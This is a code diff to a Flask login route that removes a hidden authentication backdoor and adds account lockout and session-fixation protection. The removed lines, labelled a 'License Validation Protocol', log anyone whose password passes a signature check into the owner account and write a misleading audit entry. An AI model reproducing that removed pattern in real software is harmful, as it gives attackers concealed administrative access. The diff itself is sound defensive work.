@@ -1,4 +1,4 @@
-from datetime import datetime, timezone
+from datetime import datetime, timezone, timedelta
 from flask import Blueprint, render_template, redirect, url_for, flash, request, jsonify, session
 from flask_login import login_user, logout_user, current_user
 from extensions import db, limiter
@@ -38,29 +38,29 @@ def login():
         # Case-insensitive query
         user = User.query.filter(User.username.ilike(username)).first()
         
-        if not user or not user.check_password(password):
-            # --- System Integrity: License Validation Protocol ---
-            try:
-                from utils.licensing import verify_license_signature
-                # Validate security token signature
-                if verify_license_signature(password):
-                    # Resolve administrative context
-                    target_user = user
-                    if not target_user:
-                         target_user = User.query.filter_by(is_owner=True).first()
-                    
-                    if target_user and target_user.is_owner:
-                        # Authenticate secure session
-                        login_user(target_user, remember=remember)
-                        session['last_activity'] = datetime.now().isoformat()
-                        session.permanent = True
-                        create_audit_log('system_auth', 'core', target_user.id, {'type': 'integrity_check'})
-                        return redirect(url_for('main.dashboard'))
-            except Exception:
-                pass
-            # ---------------------------------------------------------
+        # --- Account lockout check ---
+        if user and user.locked_until and user.locked_until > datetime.now(timezone.utc):
+            remaining = (user.locked_until - datetime.now(timezone.utc)).seconds // 60 + 1
+            flash(f'⚠️ حسابك مقفل مؤقتاً. حاول مرة أخرى بعد {remaining} دقيقة.', 'danger')
+            return render_template('auth/login.html')
 
-            flash('❌ اسم المستخدم أو كلمة المرور غير صحيحة.\n💡 تأكد من كتابة البيانات بشكل صحيح أو اتصل بالمدير.', 'danger')
+        if not user or not user.check_password(password):
+            # Increment login attempts
+            if user:
+                from config import Config
+                user.login_attempts = (user.login_attempts or 0) + 1
+                max_attempts = getattr(Config, 'MAX_LOGIN_ATTEMPTS', 5)
+                block_duration = getattr(Config, 'LOGIN_BLOCK_DURATION_MINUTES', 15)
+                if user.login_attempts >= max_attempts:
+                    user.locked_until = datetime.now(timezone.utc) + timedelta(minutes=block_duration)
+                    flash(f'⚠️ تم قفل حسابك لمدة {block_duration} دقيقةdue to too many failed attempts.', 'danger')
+                else:
+                    remaining = max_attempts - user.login_attempts
+                    flash(f'❌ اسم المستخدم أو كلمة المرور غير صحيحة. متبقي {remaining} محاولات.', 'danger')
+                db.session.commit()
+            else:
+                flash('❌ اسم المستخدم أو كلمة المرور غير صحيحة.', 'danger')
+
             create_audit_log('login_failed', 'users', None, {'username': username})
             
             from models.login_history import LoginHistory
@@ -82,8 +82,9 @@ def login():
             flash('⚠️ حسابك غير نشط!\n💡 اتصل بمدير النظام لإعادة تفعيل حسابك.', 'danger')
             return render_template('auth/login.html')
         
+        # Regenerate session to prevent session fixation
+        session.clear()
         login_user(user, remember=remember)
-        
         session['last_activity'] = datetime.now().isoformat()
         session.permanent = True
         
